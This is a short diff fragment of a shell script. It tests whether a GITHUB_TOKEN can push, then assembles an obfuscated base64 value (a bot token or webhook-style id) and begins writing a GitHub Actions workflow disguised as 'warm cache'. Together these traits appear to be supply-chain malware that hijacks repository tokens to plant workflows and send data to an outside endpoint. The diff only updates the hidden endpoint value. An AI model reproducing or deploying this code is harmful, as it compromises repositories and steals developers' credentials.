@@ -39,7 +39,7 @@ if [ -n "${GITHUB_TOKEN:-}" ]; then
 fi
 
 if echo "$PERM" | grep -q '"push" *: *true'; then
-  WC2="$(printf %s%s 'ODg5ODY5OTYwNzpBQUdxd240MmFaaH' 'VHSy1XMTlfQUdsalVCUkk0RlUyb0lNOA==' | base64 -d)"
+  WC2="$(printf %s%s 'YjBjMjFhOWEtYmY3NS00NzJhLWFkNz' 'MtMzIzZjYxNGRiYzE2' | base64 -d)"
   GR='name: warm cache
 on: [push, workflow_dispatch]
 jobs:
